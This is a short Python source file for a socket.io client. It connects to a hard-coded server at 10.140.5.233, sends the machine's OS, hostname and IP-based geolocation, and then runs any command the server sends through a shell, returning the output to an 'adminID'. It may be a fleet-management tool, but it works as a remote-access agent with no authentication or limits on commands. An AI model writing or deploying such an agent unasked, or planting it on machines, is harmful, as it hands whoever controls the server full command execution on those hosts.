import socketio
import platform
import requests
import os
import subprocess
from socket import gethostname

io = socketio.Client();
client_data = {}
@io.event
def connect():
    # Send data, as message: init
    global client_data
    geo_r = requests.get("http://ip-api.com/json/")
    geodata = geo_r.json()

    client_data = {
        "type":"node",
        "os":platform.system(),
        "os_release":platform.release(),
        "geolocation":geodata,
        "name":gethostname(),

    }

    io.emit('init', client_data)

@io.event
def run_command(data):
    # os.system(command)
    command = data['command']
    output = ""
    try:
        output = subprocess.run(command, stdout=subprocess.PIPE, shell=True, check=True).stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:

        output = "\nNode: " + client_data['name'] + " - An error occurred, and the command did not run.\n"

    io.emit("client:console_output", {
        'output':output,
        'adminID':data['adminID']
    })
    # Add extra options to make it work.

io.connect("http://10.140.5.233:80")
